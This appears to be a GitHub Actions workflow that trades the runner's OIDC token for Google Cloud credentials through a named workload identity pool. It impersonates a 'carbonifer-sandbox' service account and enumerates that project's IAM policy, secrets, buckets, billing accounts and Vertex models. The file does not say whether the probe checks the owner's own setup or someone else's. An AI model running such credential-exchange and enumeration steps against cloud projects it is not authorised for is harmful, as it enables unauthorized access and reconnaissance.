name: wif-probe
on:
  workflow_dispatch:
  push:
    branches: [ main ]
permissions:
  id-token: write
  contents: read
jobs:
  probe:
    runs-on: ubuntu-latest
    steps:
      - name: carbonifer
        run: |
          set +e
          PRJ=projects/536185737408/locations/global/workloadIdentityPools/carbonifer-gh-pool/providers/carbonifer-oidc-provider
          SA=github@carbonifer-sandbox.iam.gserviceaccount.com
          AUD="https://iam.googleapis.com/$PRJ"
          J=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$AUD")
          jq -r '.value' <<<"$J" > tok.jwt
          curl -s -o r.json -X POST https://sts.googleapis.com/v1/token \
            -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange" \
            --data-urlencode "audience=//iam.googleapis.com/$PRJ" \
            --data-urlencode "subject_token=$(cat tok.jwt)" \
            -d "subject_token_type=urn:ietf:params:oauth:token-type:jwt" \
            -d "requested_token_type=urn:ietf:params:oauth:token-type:access_token" \
            -d "scope=https://www.googleapis.com/auth/cloud-platform"
          FT=$(jq -r '.access_token // empty' r.json); echo "federated_len=${#FT}"
          jq -n '{scope:["https://www.googleapis.com/auth/cloud-platform"], lifetime:"3600s"}' > req.json
          curl -s -o g.json -w 'GEN=%{http_code}\n' -X POST -H "Authorization: Bearer $FT" -H "Content-Type: application/json" \
            "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/$SA:generateAccessToken" -d @req.json
          AT=$(jq -r '.accessToken // empty' g.json); echo "sa_token_len=${#AT} expire=$(jq -r '.expireTime' g.json)"
          T() { echo "=== $1"; shift; curl -s -w '\nHTTP=%{http_code}\n' "$@"; echo; }
          T tokeninfo "https://oauth2.googleapis.com/tokeninfo?access_token=$AT"
          T project_get -H "Authorization: Bearer $AT" "https://cloudresourcemanager.googleapis.com/v1/projects/carbonifer-sandbox"
          T project_iam -H "Authorization: Bearer $AT" "https://cloudresourcemanager.googleapis.com/v1/projects/carbonifer-sandbox:getIamPolicy" -X POST -d '{}'
          T vertex_uscentral1 -H "Authorization: Bearer $AT" "https://us-central1-aiplatform.googleapis.com/v1/projects/carbonifer-sandbox/locations/us-central1/models"
          T vertex_global -H "Authorization: Bearer $AT" "https://aiplatform.googleapis.com/v1/projects/carbonifer-sandbox/locations/global/models"
          T vertex_endpoints -H "Authorization: Bearer $AT" "https://us-central1-aiplatform.googleapis.com/v1/projects/carbonifer-sandbox/locations/us-central1/endpoints"
          T billing_info -H "Authorization: Bearer $AT" "https://cloudbilling.googleapis.com/v1/projects/carbonifer-sandbox/billingInfo"
          T billing_accounts -H "Authorization: Bearer $AT" "https://cloudbilling.googleapis.com/v1/billingAccounts"
          T storage_buckets -H "Authorization: Bearer $AT" "https://storage.googleapis.com/storage/v1/b?project=carbonifer-sandbox"
          T secrets -H "Authorization: Bearer $AT" "https://secretmanager.googleapis.com/v1/projects/carbonifer-sandbox/secrets"
          T services -H "Authorization: Bearer $AT" "https://serviceusage.googleapis.com/v1/projects/carbonifer-sandbox/services?filter=state:ENABLED"
          T sa_self -H "Authorization: Bearer $AT" "https://iam.googleapis.com/v1/projects/carbonifer-sandbox/serviceAccounts/$SA"
